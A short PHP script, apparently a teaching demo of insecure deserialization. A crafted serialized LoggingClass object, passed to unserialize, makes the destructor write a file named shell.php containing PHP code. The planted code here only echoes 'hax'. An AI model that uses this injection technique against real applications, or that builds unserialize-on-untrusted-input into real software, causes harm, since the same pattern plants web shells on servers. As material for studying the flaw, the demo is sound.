<?php
class LoggingClass {

    function __construct($filename, $content) {
        // add .log to the filename so we are really creating a log file!!
        $this->filename = $filename . ".log";
        $this->content = $content;
    }
    
    // This method is executed for each object at the end of the PHP execution
    function __destruct() {
        // flush the logs
        file_put_contents($this->filename, $this->content);
    }

}

$data = unserialize('O:12:"LoggingClass":2:{s:8:"filename";s:9:"shell.php";s:7:"content";s:20:"<?php echo "hax"; ?>";}');
echo $data->filename."\n";
echo $data->content."\n";
